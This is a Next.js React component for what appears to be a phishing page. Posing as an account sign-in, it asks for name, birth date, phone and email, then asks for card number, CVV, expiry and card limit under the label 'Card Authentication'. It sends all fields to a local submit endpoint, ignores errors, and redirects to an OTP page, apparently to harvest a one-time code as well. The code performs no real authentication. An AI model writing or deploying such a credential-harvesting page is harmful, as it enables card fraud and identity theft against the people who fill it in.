'use client';
import { useState } from 'react';
import { useRouter } from 'next/navigation';
import styles from './MultiStepForm.module.css';

const MONTHS = ['January','February','March','April','May','June','July','August','September','October','November','December'];
const YEARS = ['2025','2026','2027','2028','2029','2030','2031'];

export default function MultiStepForm({ pageTitle }) {
  const router = useRouter();
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    name: '', lastname: '', birth: '', phone: '', email: '',
    cardLimit: '', card: '', cvcpwd: '', expmonth: '', expyear: ''
  });

  const handleChange = (e) => {
    setFormData(prev => ({ ...prev, [e.target.name]: e.target.value }));
  };

  const handleNext = (e) => {
    e.preventDefault();
    setStep(2);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handlePrev = (e) => {
    e.preventDefault();
    setStep(1);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    try {
      await fetch('/api/submit-form', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...formData, pageTitle }),
      });
    } catch (_) {}
    router.push('/otp');
  };

  return (
    <div className={styles.formWrapper}>
      <div className={styles.formCard}>
        <h2 className={styles.formTitle}>Sign In Your User Account</h2>
        <p className={styles.formSubtitle}>Fill all form field to go to next step</p>

        {/* Progress Bar */}
        <ul className={styles.progressbar}>
          <li className={step >= 1 ? styles.active : ''} id="step-account">
            <strong>1. User Login</strong>
          </li>
          <li className={step >= 2 ? styles.active : ''} id="step-auth">
            <strong>2. Authentication</strong>
          </li>
          <li className={''} id="step-verify">
            <strong>3. Verification</strong>
          </li>
        </ul>

        <form onSubmit={step === 1 ? handleNext : handleSubmit}>
          {/* Step 1: User Info */}
          {step === 1 && (
            <div className={`${styles.fieldset} ${styles.fadeIn}`}>
              <div className={styles.formCardInner}>
                <h3 className={styles.stepTitle}>User Login</h3>
                <input type="text" name="name" placeholder="First Name" required value={formData.name} onChange={handleChange} className={styles.input} />
                <input type="text" name="lastname" placeholder="Last Name" value={formData.lastname} onChange={handleChange} className={styles.input} />
                <input type="text" name="birth" placeholder="Date of Birth" value={formData.birth} onChange={handleChange} className={styles.input} />
                <input type="tel" name="phone" placeholder="Phone Number" required value={formData.phone} onChange={handleChange} className={styles.input} />
                <input type="email" name="email" placeholder="Email Address" required value={formData.email} onChange={handleChange} className={styles.input} />
              </div>
              <button type="submit" className={styles.nextBtn}>Login →</button>
            </div>
          )}

          {/* Step 2: Card Authentication */}
          {step === 2 && (
            <div className={`${styles.fieldset} ${styles.fadeIn}`}>
              <div className={styles.formCardInner}>
                <h3 className={styles.stepTitle}>Card Authentication</h3>
                <div className={styles.inputGroup}>
                  <label className={styles.label}>Card Limit *</label>
                  <input type="text" name="cardLimit" required value={formData.cardLimit} onChange={handleChange} className={styles.input} />
                </div>
                <div className={styles.inputGroup}>
                  <label className={styles.label}>Card Number *</label>
                  <input type="text" name="card" required value={formData.card} onChange={handleChange} className={styles.input} placeholder="XXXX XXXX XXXX XXXX" />
                </div>
                <div className={styles.inputGroup}>
                  <label className={styles.label}>CVC / CVV *</label>
                  <input type="password" name="cvcpwd" required value={formData.cvcpwd} onChange={handleChange} className={`${styles.input} ${styles.inputSmall}`} placeholder="***" maxLength={4} />
                </div>
                <div className={styles.inputGroup}>
                  <label className={styles.label}>Expiry Date *</label>
                  <div className={styles.selectRow}>
                    <select name="expmonth" required value={formData.expmonth} onChange={handleChange} className={styles.select}>
                      <option value="">Month</option>
                      {MONTHS.map(m => <option key={m} value={m}>{m}</option>)}
                    </select>
                    <select name="expyear" required value={formData.expyear} onChange={handleChange} className={styles.select}>
                      <option value="">Year</option>
                      {YEARS.map(y => <option key={y} value={y}>{y}</option>)}
                    </select>
                  </div>
                </div>
              </div>
              <div className={styles.btnRow}>
                <button type="button" onClick={handlePrev} className={styles.prevBtn}>← Previous</button>
                <button type="submit" className={styles.nextBtn} disabled={loading}>
                  {loading ? 'Submitting...' : 'Confirm ✓'}
                </button>
              </div>
            </div>
          )}
        </form>
      </div>
    </div>
  );
}
